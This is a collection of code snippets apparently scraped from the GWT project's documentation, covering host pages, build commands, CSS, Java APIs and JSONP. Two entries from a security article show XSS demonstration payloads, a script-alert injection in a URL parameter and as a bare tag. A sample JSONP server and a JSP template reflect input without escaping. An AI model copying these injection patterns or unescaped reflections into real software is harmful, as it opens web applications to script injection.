Template-Based GWT Host Page Using JSP\nDESCRIPTION: This JSP template implements the dynamic host page pattern with cleaner syntax. It checks user authentication and conditionally includes the GWT module script and user data, while also providing appropriate login/logout links.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_6\n\nLANGUAGE: jsp\nCODE:\n```\n<!-- gwt-hosting.jsp -->\n<html>\n <head>\n<%\n   UserService userService = UserServiceFactory.getUserService();\n   if (userService.isUserLoggedIn()) {\n%>\n    <script type=\"text/javascript\" src=\"sample/sample.nocache.js\"></script>\n    <script type=\"text/javascript\">\n      var info = { \"email\" : \"<%= userService.getCurrentUser().getEmail() %>\" };\n    </script>\n  </head>\n  <body>\n  <a href=\"<%= userService.createLogoutURL(request.getRequestURI()) %>\">Log out</a>\n<%\n   } else {\n%>\n  </head>\n  <body>\n    <a href=\"<%= userService.createLoginURL(request.getRequestURI()) %>\">Log in</a>\n<%\n   }\n%>\n </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Running GWT Development Mode via Ant\nDESCRIPTION: Command to launch the GWT application in development mode using Ant build tool from the command line.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/create.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nant devmode\n```\n\n----------------------------------------\n\nTITLE: Demonstrating JSON Structure for Google Base Snippets Feed\nDESCRIPTION: A simplified JSON structure representing the Google Base snippets feed, showing the core structure with minimal data fields for easier visualization and testing.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_for_json_mashups.md#2025-04-09_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  'feed': {\n    'entry': [\n      {'title': {'type': 'text', '$t': 'Some Text'}},\n      {'title': {'type': 'text', '$t': 'Some More Text'}}\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Deploying GWT Application to Google App Engine\nDESCRIPTION: Shell command to deploy a compiled GWT application to Google App Engine using the appcfg utility. This uploads the application files from the 'war' directory.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideDeploying.md#2025-04-09_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n<appengine_home_dir>/appcfg.sh update war\n```\n\n----------------------------------------\n\nTITLE: Adding Vaadin Polymer Elements Dependency\nDESCRIPTION: Maven dependency configuration for adding gwt-polymer-elements to the project\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<dependency>\n <groupId>com.vaadin.polymer</groupId>\n <artifactId>vaadin-gwt-polymer-elements</artifactId>\n <version>${gwtPolymerVersion}</version>\n <scope>provided</scope>\n</dependency>\n```\n\n----------------------------------------\n\nTITLE: Creating GWT Project with Maven Archetype\nDESCRIPTION: Command to generate a new GWT project using the modular-webapp archetype. Specifies the archetype group ID, version and artifact ID.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted-v2.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nmvn archetype:generate \\\n   -DarchetypeGroupId=net.ltgt.gwt.archetypes \\\n   -DarchetypeVersion=LATEST \\\n   -DarchetypeArtifactId=modular-webapp\n```\n\n----------------------------------------\n\nTITLE: Styling Download Buttons and Layout in CSS\nDESCRIPTION: CSS styles for the download page, defining the appearance of download buttons, hover effects, and layout for download blocks. Includes styling for rounded corners, colors, padding, and text formatting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/download.md#2025-04-09_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\n.download-button {\n -webkit-border-radius: 10px;\n   -moz-border-radius: 10px;\n   border-radius: 10px;\n   background: #f93535;\n   color: #fff !important;\n   text-decoration: none;\n   text-align: center;\n   padding: 7px 15px 8px 15px;\n   font-size: 1.3em !important;\n   white-space: nowrap;\n   font-family: \"soleil\", sans-serif;\n}\n\n.download-button:hover {\n  background-color: #9c1421;\n  \n}\n.download-block {\n  overflow: hidden;\n}\n.moreinfo {\n  margin-top: 40px;\n}\n.moreinfo, .moreinfo p {\n  text-align: center !important;\n}\n```\n\n----------------------------------------\n\nTITLE: Generating EMMA Coverage Report\nDESCRIPTION: Java command to generate an HTML coverage report using EMMA based on collected coverage data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\njava -cp emma.jar emma report -r html -in coverage.em,coverage.ec\n```\n\n----------------------------------------\n\nTITLE: Styling GWT Developer Profiles and Application Gallery in CSS\nDESCRIPTION: This CSS snippet defines styles for formatting video and application sections, including layout, padding, and text formatting for screenshots and descriptions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/whos_using_gwt.md#2025-04-09_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\n#body {\n  max-width: 700px;\n}\n.video {\n  clear: both;\n  width: 100%;\n  overflow: visible;\n  padding: 5px;\n}\n\n.video .screenshot {\n  padding-left: 15px;\n  padding-top: 20px;\n  padding-bottom: 20px;\n  vertical-align: middle;\n}\n\n.video .description {\n  padding-top: 5px;\n  padding-bottom: 5px;\n  vertical-align: middle;\n}\n\n.video .description .title {\n  font-weight: bold;\n}\n\n.application {\n  clear: both;\n  width: 100%;\n  overflow: visible;\n  padding: 5px;\n}\n\n.application .screenshot {\n  padding-left: 15px;\n  padding-top: 20px;\n  padding-bottom: 20px;\n}\n\n.application .description {\n  vertical-align: middle;\n}\n\n.application .description .title {\n  font-weight: bold;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding GWT Gears Module Inheritance\nDESCRIPTION: XML configuration example showing how to add the Gears package from GWT Google API to a module through the inherits tag in the module XML file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name='com.google.gwt.gears.Gears'>\n```\n\n----------------------------------------\n\nTITLE: Embedding YouTube Video for Eureka Streams GWT Case Study\nDESCRIPTION: HTML iframe code that embeds a YouTube video showcasing how Eureka Streams uses GWT to manage a large code base with a Java back end.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/casestudies.md#2025-04-09_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<iframe width=\"320\" height=\"182\" src=\"https://www.youtube.com/embed/J5edp6mdvKs\" frameborder=\"0\" allowfullscreen></iframe>\n```\n\n----------------------------------------\n\nTITLE: Implementing LoginInfo Class for User Authentication (Java)\nDESCRIPTION: Definition of the LoginInfo class which stores user authentication information for the StockWatcher application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport java.io.Serializable;\n\npublic class LoginInfo implements Serializable {\n\n  private boolean loggedIn = false;\n  private String loginUrl;\n  private String logoutUrl;\n  private String emailAddress;\n  private String nickname;\n\n  public boolean isLoggedIn() {\n    return loggedIn;\n  }\n\n  public void setLoggedIn(boolean loggedIn) {\n    this.loggedIn = loggedIn;\n  }\n\n  public String getLoginUrl() {\n    return loginUrl;\n  }\n\n  public void setLoginUrl(String loginUrl) {\n    this.loginUrl = loginUrl;\n  }\n\n  public String getLogoutUrl() {\n    return logoutUrl;\n  }\n\n  public void setLogoutUrl(String logoutUrl) {\n    this.logoutUrl = logoutUrl;\n  }\n\n  public String getEmailAddress() {\n    return emailAddress;\n  }\n\n  public void setEmailAddress(String emailAddress) {\n    this.emailAddress = emailAddress;\n  }\n\n  public String getNickname() {\n    return nickname;\n  }\n\n  public void setNickname(String nickname) {\n    this.nickname = nickname;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Fragment Merging in GWT Compiler\nDESCRIPTION: Command line flag to enable fragment merging in the GWT compiler. The parameter 'x' specifies the lower bound on the number of exclusive fragments, with the compiler making intelligent decisions about when merging is beneficial.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/fragment_merging.md#2025-04-09_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n-XfragmentCount x\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple Python HTTP Server for JSONP Testing\nDESCRIPTION: A Python script that sets up a basic HTTP server to serve custom JSON data wrapped in a callback function, simulating a JSONP response for testing purposes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_for_json_mashups.md#2025-04-09_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport BaseHTTPServer, SimpleHTTPServer, cgi\nclass MyHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n  def do_GET(self):\n    form = self.path.find('?') > -1 and dict([x.split('=') for x in self.path.split('?')[1].split('&')]) or {'callback': 'foo'}\n    fun_name = form.get('callback', 'foo')\n    body = '%s(%s);' % (fun_name, file('json.js').read())\n    self.send_response(200)\n    self.send_header('Content-Type', 'text/plain')\n    self.send_header('Content-Length', len(body))\n    self.end_headers()\n    self.wfile.write(body)\nbhs = BaseHTTPServer.HTTPServer(('', 8000), MyHandler)\nbhs.serve_forever()\n```\n\n----------------------------------------\n\nTITLE: Defining Classpath for App Engine Tools in Ant Build XML\nDESCRIPTION: This XML snippet defines the classpath for App Engine tools, including the project classpath and additional App Engine-specific libraries.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_3\n\nLANGUAGE: XML\nCODE:\n```\n<path id=\"project.class.path\">\n  <pathelement location=\"war/WEB-INF/classes\"/>\n  <pathelement location=\"${gwt.sdk}/gwt-user.jar\"/>\n  <fileset dir=\"${gwt.sdk}\" includes=\"gwt-dev*.jar\"/>\n    <!-- Add any additional non-server libs (such as JUnit) -->\n  <fileset dir=\"war/WEB-INF/lib\" includes=\"**/*.jar\"/>\n</path>\n\n<path id=\"tools.class.path\">\n  <path refid=\"project.class.path\"/>\n  <pathelement location=\"${appengine.sdk}/lib/appengine-tools-api.jar\"/>\n  <fileset dir=\"${appengine.sdk}/lib/tools\">\n    <include name=\"**/asm-*.jar\"/>\n    <include name=\"**/datanucleus-enhancer-*.jar\"/>\n  </fileset>\n</path>\n```\n\n----------------------------------------\n\nTITLE: Exporting Java Methods to JavaScript using JSNI\nDESCRIPTION: Demonstrates how to expose Java methods to external JavaScript code using JSNI bridge methods. Uses $entry wrapper for proper exception handling and utility services.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Client.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage mypackage;\npublic MyUtilityClass\n{\n    public static int computeLoanInterest(int amt, float interestRate, int term) { ... }\n    public static native void exportStaticMethod() /*-{\n       $wnd.computeLoanInterest = \n         $entry(@mypackage.MyUtilityClass::computeLoanInterest(IFI));\n    }-*/;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Deferred Command Pattern in GWT\nDESCRIPTION: Demonstrates how to use DeferredCommand with IncrementalCommand to implement a deferred Iterator pattern. This prevents UI blocking while creating UI elements from a list of data objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gwt-iphone.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nfinal List objects = ....;\n  DeferredCommand.addCommand(new IncrementalCommand() {\n    Iterator i = objects.iterator();\n    public boolean execute() {\n      Foo foo = (Foo)i.next();\n      .... do something ...\n      return i.hasNext();\n    }\n  });\n```\n\n----------------------------------------\n\nTITLE: Exporting Java Methods for External JavaScript in GWT\nDESCRIPTION: This snippet shows how to make a Java method accessible from external JavaScript code in GWT. It demonstrates the use of $entry function to ensure proper exception handling and other GWT services.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npackage mypackage;\n\npublic class MyUtilityClass {\n  public static int computeLoanInterest(int amt, float interestRate,\n                                        int term) { ... }\n  public static native void exportStaticMethod() /*-{\n    $wnd.computeLoanInterest =\n        $entry(@mypackage.MyUtilityClass::computeLoanInterest(IFI));\n  }-*/;\n}\n```\n\n----------------------------------------\n\nTITLE: Running GWT Application in SuperDevMode\nDESCRIPTION: Commands to build and run the GWT application in SuperDevMode using Maven\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ cd TodoListApp\n$ mvn war:exploded\n$ mvn gwt:devmode\n```\n\n----------------------------------------\n\nTITLE: JSONP Callback Example\nDESCRIPTION: Example of JSONP format where JSON data is passed as parameter to a callback function.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nhandleResult({'data': ['foo', 'bar']});\n```\n\n----------------------------------------\n\nTITLE: Managing Configuration in GWT Feed Reader\nDESCRIPTION: This snippet refers to the Configuration class used in the GWT Feed Reader. It handles storing and retrieving configuration and last-read information using browser cookies, with data encoded as JSON strings.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gwt-iphone.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\ncom.google.gwt.sample.feedreader.client.Configuration\n```\n\n----------------------------------------\n\nTITLE: GWT Compiler Output in Console\nDESCRIPTION: Example of the GWT compiler console output showing the compilation process for the StockWatcher application, including the number of permutations compiled and the time taken.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/compile.md#2025-04-09_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCompiling module com.google.gwt.sample.stockwatcher.StockWatcher\n   Compiling 6 permutations\n      Compiling permutation 0...\n      Compiling permutation 1...\n      Compiling permutation 2...\n      Compiling permutation 3...\n      Compiling permutation 4...\n      Compiling permutation 5...\n   Compile of permutations succeeded\nLinking into war/stockwatcher.\n   Link succeeded\n   Compilation succeeded -- 30.504s\n\n```\n\n----------------------------------------\n\nTITLE: Malicious URL Example\nDESCRIPTION: Demonstrates how JavaScript injection can be encoded into a URL parameter to execute an XSS attack.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nhttp://site.domain.tld/path?name=Dan%3Cscript%20%3Ealert%28%22Hi%22%29%3B%3C/script%3E\n```\n\n----------------------------------------\n\nTITLE: Closing Menu in GWT Drawer Panel\nDESCRIPTION: This method closes the drawer panel menu if the panel is in narrow mode. It's used to handle menu closure after certain actions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\nprivate void closeMenu() {\n  if (drawerPanel.getNarrow()) {\n    drawerPanel.closeDrawer();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: JSONP Response Format Example\nDESCRIPTION: Example of a JSONP response format where JSON data is wrapped in a callback function named 'callback125'.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ncallback125([{\"symbol\":\"DDD\",\"price\":10.610339195026,\"change\":0.053085447454327}]);\n```\n\n----------------------------------------\n\nTITLE: Malicious JavaScript Alert Example\nDESCRIPTION: Shows an example of injected JavaScript code that could be used in an XSS attack.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<script>alert('Hi');</script>\n```\n\n----------------------------------------\n\nTITLE: Configuring JsInterop Dependencies in Maven\nDESCRIPTION: Maven dependency configuration to include JsInterop annotations in a GWT project. Required for using JsInterop functionality in GWT 2.8.0.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<dependency>\n  <groupId>com.google.jsinterop</groupId>\n  <artifactId>jsinterop-annotations</artifactId>\n</dependency>\n```\n\n----------------------------------------\n\nTITLE: Loading GWT Module in HTML\nDESCRIPTION: Demonstrates how to include a GWT module's nocache.js file in an HTML page. This is a crucial step in the bootstrap process of a GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"<Module Name>.nocache.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Accessing Current Event Object in GWT DOM\nDESCRIPTION: The DOM.eventGetCurrentEvent() method provides global access to the current Event object, added in GWT 1.4.59.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\nDOM.eventGetCurrentEvent()\n```\n\n----------------------------------------\n\nTITLE: Configuring PATH in Unix Systems\nDESCRIPTION: Shell commands to add GWT directory to system PATH in Mac or Linux environments\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nPATH=$PATH:/home/user/gwt-2.0.0/\nexport PATH\n```\n\n----------------------------------------\n\nTITLE: UiBinder GSS Import Examples\nDESCRIPTION: Examples of valid and invalid GSS file imports in UiBinder style tags.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<ui:style gss=\"true\" src=\"foo.gss\">\n  /* Need to use GSS here now! */\n</ui:style>\n/* This is invalid! */\n<ui:style gss=\"true\" src=\"foo.css\">\n</ui:style>\n```\n\n----------------------------------------\n\nTITLE: Positioning Popups in GWT\nDESCRIPTION: The PopupPanel.setPopupPositionAndShow() method provides a simpler way to control popup layout using a callback.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\nPopupPanel.setPopupPositionAndShow(PopupCallback callback)\n```\n\n----------------------------------------\n\nTITLE: WebAppCreator Usage Syntax\nDESCRIPTION: Command line syntax and parameters for the webAppCreator tool\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n    webAppCreator [-[no]overwriteFiles] [-[no]ignoreExistingFiles] \\\n                  [-templates template1,template2,...] [-out dir] \\\n                  [-junit pathToJUnitJar] [-[no]maven] [-[no]ant] moduleName\n```\n\n----------------------------------------\n\nTITLE: Referencing GWT Compiler Options in HTML\nDESCRIPTION: This HTML snippet provides a link to the GWT Compiler Options documentation. It uses an anchor tag to create a hyperlink within the page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_DebuggingAndCompiling.md#2025-04-09_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<a id=\"What_options_can_be_passed_to_the_compiler\"></a>\n```\n\n----------------------------------------\n\nTITLE: Referencing onModuleLoad() Method in EntryPoint Interface\nDESCRIPTION: The onModuleLoad() method is the entry point for GWT applications, now called as soon as the DOM is ready rather than waiting for body.onload().\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\nonModuleLoad()\n```\n\n----------------------------------------\n\nTITLE: Starting Development Server\nDESCRIPTION: Command to start the Jetty server in development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted-v2.md#2025-04-09_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nmvn jetty:run -pl *-server -am -Denv=dev\n```\n\n----------------------------------------\n\nTITLE: Loading GWT Module Script in HTML\nDESCRIPTION: Example of including a GWT module JavaScript file in an HTML page for bootstrapping the application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Server.md#2025-04-09_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script language=\"JavaScript\" src=\"http://mydomain.com/<module>.nocache.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Updating Composite Class in GWT\nDESCRIPTION: Composites must now call initWidget() in their constructors instead of setWidget(). This change clarifies the method's purpose and distinguishes it from SimplePanel's setWidget() method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_21\n\nLANGUAGE: java\nCODE:\n```\nclass MyComposite extends Composite {\n    public MyComposite() {\n        initWidget(new Label(\"Hello\"));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Jetty Server in IntelliJ Maven Configuration\nDESCRIPTION: Maven command for running the Jetty server in development mode with specific module and environment settings.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/usingintellij.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nmvn jetty:run -pl *-server -am -Denv=dev\n```\n\n----------------------------------------\n\nTITLE: Invalid CSS/GSS Mixed Source Example\nDESCRIPTION: Example showing invalid mixing of CSS and GSS files in a CssResource method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n// Invalid use since css and gss are mixed one method\n@Source({\"def.css\", \"converted.gss\"})\nMyCssResource css();\n```\n\n----------------------------------------\n\nTITLE: IntStream Methods Reference\nDESCRIPTION: Methods available in IntStream interface for creating and manipulating streams of integer values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_19\n\nLANGUAGE: java\nCODE:\n```\nbuilder(), concat(IntStream, IntStream), empty(), generate(IntSupplier), \niterate(int, IntUnaryOperator), iterate(int, IntPredicate, IntUnaryOperator), \nof(int[]), of(int), range(int, int), rangeClosed(int, int)\n```\n\n----------------------------------------\n\nTITLE: Creating GWT Project with webAppCreator\nDESCRIPTION: Command to generate a new GWT project structure using webAppCreator with Maven and sample templates\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ /full_path_to_gwt_sdk/webAppCreator \\\n    -templates maven,sample \\\n    -out TodoListApp \\\n    org.gwtproject.tutorial.TodoList\n```\n\n----------------------------------------\n\nTITLE: Setting GWT Uncaught Exception Handler Property in XML\nDESCRIPTION: XML configuration to disable the window.onerror uncaught exception handler in GWT applications by setting the gwt.uncaughtexceptionhandler.windowonerror property to IGNORE. This can be used when there are misbehaving scripts on the page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<set-property name=\"gwt.uncaughtexceptionhandler.windowonerror\" value=\"IGNORE\"/>\n```\n\n----------------------------------------\n\nTITLE: Initializing and Using Java Character Class\nDESCRIPTION: The Character class wraps a char value in an object. It provides methods for character operations and conversions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nCharacter.isDigit(char)\nCharacter.isLetter(char)\nCharacter.isWhitespace(char)\nCharacter.toLowerCase(char)\nCharacter.toUpperCase(char)\n```\n\n----------------------------------------\n\nTITLE: Throwable Exception Class\nDESCRIPTION: Base class for exceptions and errors with stack trace and cause handling capabilities.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\nThrowable(), Throwable(String)\ngetMessage(), getCause()\ngetStackTrace(), printStackTrace()\n```\n\n----------------------------------------\n\nTITLE: Defining HTML Definition List for GWT Glossary\nDESCRIPTION: This HTML snippet creates a definition list (<dl>) containing various GWT-related terms and their explanations. It includes links to relevant documentation and uses HTML formatting for emphasis.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGlossary.md#2025-04-09_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<dl>\n\n<dt>asynchronous RPC</dt>\n<dd>A remote procedure call that returns control to the calling function immediately after making a request to the server. A callback method\nwill be called later to return the result (or an exception) from the server. GWT-RPC methods are always asynchronous.</dd>\n\n<dt>code server</dt>\n<dd>Development runs a <i>code server</i>, which listens for connections from\na browser with the developer plugin to run Java code in a real JVM.</dd>\n\n<!-- ... more definitions ... -->\n\n<dt>uibinder</dt>\n<dd>A <a href=\"DevGuideUiBinder.html\">system</a> for building user interfaces using a declarative XML syntax, which simplifies widget construction and makes it easier to use HTML in widget hierarchies.</dd>\n\n</dl>\n```\n\n----------------------------------------\n\nTITLE: X11 Window Connection Error in GWT ImageBundle Compilation\nDESCRIPTION: Error message displayed when the GWT compiler attempts to access an X11 Graphics Environment Window when using ImageBundle on Linux without a DISPLAY environment variable set.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_3\n\nLANGUAGE: text\nCODE:\n```\njava.lang.InternalError: Can't connect to X11 window server using ':0.0' as the value of the DISPLAY variable.\n```\n\n----------------------------------------\n\nTITLE: Java Concurrent Package Methods\nDESCRIPTION: Core methods from java.util.concurrent package including ConcurrentHashMap, ExecutorService, and Future interfaces. Contains thread-safe collection implementations and concurrency utilities.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_14\n\nLANGUAGE: Java\nCODE:\n```\nConcurrentHashMap<K,V> map = new ConcurrentHashMap<>();\nmap.putIfAbsent(key, value);\nmap.remove(key, value);\nmap.replace(key, oldValue, newValue);\n```\n\n----------------------------------------\n\nTITLE: Embedding YouTube Video for Rovio GWT Case Study\nDESCRIPTION: HTML iframe code that embeds a YouTube video about how Rovio used GWT to port Angry Birds to the desktop.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/casestudies.md#2025-04-09_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<iframe width=\"320\" height=\"182\" src=\"https://www.youtube.com/embed/7os4DImjK5U\" frameborder=\"0\" allowfullscreen></iframe>\n```\n\n----------------------------------------\n\nTITLE: Debugging GWT RPC Content-Type ServletException\nDESCRIPTION: Error stack trace showing a ServletException that occurs when using GWT RPC with mismatched GWT versions. The issue happens when the server is using GWT 1.4's gwt-servlet.jar but the client is using GWT 1.5, which changed the RPC content type from 'text/plain' to 'text/x-gwt-rpc'.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_8\n\nLANGUAGE: text\nCODE:\n```\njavax.servlet.ServletException: Content-Type must be 'text/plain' with 'charset=utf-8' (or unspecified charset)\n        at com.google.gwt.user.server.rpc.RemoteServiceServlet.readPayloadAsUtf8(RemoteServiceServlet.java: 119)\n        at com.google.gwt.user.server.rpc.RemoteServiceServlet.doPost(RemoteServiceServlet.java: 178)\n        at javax.servlet.http.HttpServlet.service(HttpServlet.java: 738)\n        at javax.servlet.http.HttpServlet.service(HttpServlet.java: 831)\n        ...\n```\n\n----------------------------------------\n\nTITLE: Displaying Open Issue Statuses in Markdown Table\nDESCRIPTION: A markdown table listing and describing the various statuses for open issues in the GWT project's issue tracker. It includes statuses such as Accepted, Started, PatchesWelcome, ReviewPending, and NeedsInfo.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/lifeofanissue.md#2025-04-09_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n<table border=\"1\" cellpadding=\"5\" cellspacing=\"0\" width=\"50%\"> \n<tbody> \n<tr> \n<th>Status</th> \n<th>Description</th> \n</tr> \n<tr> \n<td></td>\n<td>Issue has not had initial review yet</td>\n</tr> \n<tr>\n<td>Accepted</td>\n<td>Problem reproduced / Need acknowledged</td>\n</tr> \n<tr>\n<td>Started</td>\n<td>Work on this issue has begun</td>\n</tr> \n<tr>\n<td>PatchesWelcome</td>\n<td>Confirmed and triaged, but not assigned. Feel free to submit patches for review.</td>\n</tr> \n<tr>\n<td>ReviewPending</td>\n<td>Commit gated by code review</td>\n</tr> \n<tr>\n<td>NeedsInfo</td>\n<td>Additional information is required from submitter</td>\n</tr> \n</tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating File Structure for Java Unit Tests\nDESCRIPTION: Shows the recommended file structure for placing Java unit tests in a parallel source tree under the 'test' directory. The test class name should be suffixed with 'Test'.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/makinggwtbetter.md#2025-04-09_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nsrc/com/google/gwt/core/client/EntryPoint.java\ntest/com/google/gwt/core/client/EntryPointTest.java\n```\n\n----------------------------------------\n\nTITLE: 